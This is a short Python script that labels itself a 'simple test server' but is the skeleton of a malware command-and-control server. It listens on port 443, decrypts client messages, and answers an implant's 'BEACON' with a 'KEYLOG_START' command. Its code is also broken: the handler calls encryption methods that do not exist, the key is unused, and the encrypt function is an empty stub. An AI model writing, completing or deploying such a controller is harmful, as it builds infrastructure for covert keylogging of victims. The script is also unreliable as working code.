# Simple test server
import socketserver
import base64
import json

C2_KEY = b'\x01\x23\x45\x67\x89\xab\xcd\xef\xfe\xdc\xba\x98\x76\x54\x32\x10\x00\x11\x22\x33\x44\x55\x66\x77\x88\x99\xaa\xbb\xcc\xdd\xee\xff'[:32]

class C2Handler(socketserver.BaseRequestHandler):
    def handle(self):
        print(f"[+] Client connected: {self.client_address}")
        while True:
            try:
                data = self.request.recv(8192)
                if not data: break
                msg = self.crypto_decrypt(data).decode(errors='ignore')
                print(f"[{self.client_address}] {msg}")
                
                if "BEACON" in msg:
                    print("Send: KEYLOG_START")
                    self.request.send(self.crypto_encrypt("KEYLOG_START".encode()))
                    
            except: break
        print(f"[-] Client disconnected: {self.client_address}")

def crypto_encrypt(data): 
    
    pass

if __name__ == "__main__":
    server = socketserver.ThreadingTCPServer(('0.0.0.0', 443), C2Handler)
    server.serve_forever()
